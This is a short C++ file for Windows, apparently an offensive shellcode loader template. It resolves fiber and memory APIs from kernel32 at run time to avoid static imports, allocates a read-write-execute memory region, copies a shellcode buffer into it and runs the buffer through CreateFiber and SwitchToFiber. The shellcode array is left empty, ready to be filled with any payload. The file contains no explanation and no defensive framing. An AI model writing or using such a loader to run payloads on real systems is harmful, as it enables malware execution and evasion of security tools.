#include <Windows.h>


HMODULE kernel32 = GetModuleHandleA("kernel32.dll");


int main()
{

        using ConvertThreadToFiberPrototype = LPVOID(WINAPI*)(LPVOID);
        ConvertThreadToFiberPrototype ConvertThreadToFiber = (ConvertThreadToFiberPrototype)GetProcAddress(kernel32, "ConvertThreadToFiber");

        using VirtualAllocPrototype = LPVOID(WINAPI*)(LPVOID , SIZE_T , DWORD , DWORD);
        VirtualAllocPrototype VirtualAlloc = (VirtualAllocPrototype)GetProcAddress(kernel32, "VirtualAlloc");

        using CreateFiberPrototype = LPVOID(WINAPI*)(SIZE_T , LPFIBER_START_ROUTINE , LPVOID);
        CreateFiberPrototype CreateFiber = (CreateFiberPrototype)GetProcAddress(kernel32, "CreateFiber");

        using SwitchToFiberPrototype = VOID(WINAPI*)(LPVOID);
        SwitchToFiberPrototype SwitchToFiber = (SwitchToFiberPrototype)GetProcAddress(kernel32, "SwitchToFiber");


		PVOID PrimaryFiber = ConvertThreadToFiber(NULL);

	    unsigned char shellcode[] = "";

	    PVOID shellcodeLocation = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	    memcpy(shellcodeLocation, shellcode, sizeof shellcode);

		PVOID NewFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)shellcodeLocation, NULL);

		SwitchToFiber(NewFiber);

	    return EXIT_SUCCESS;
}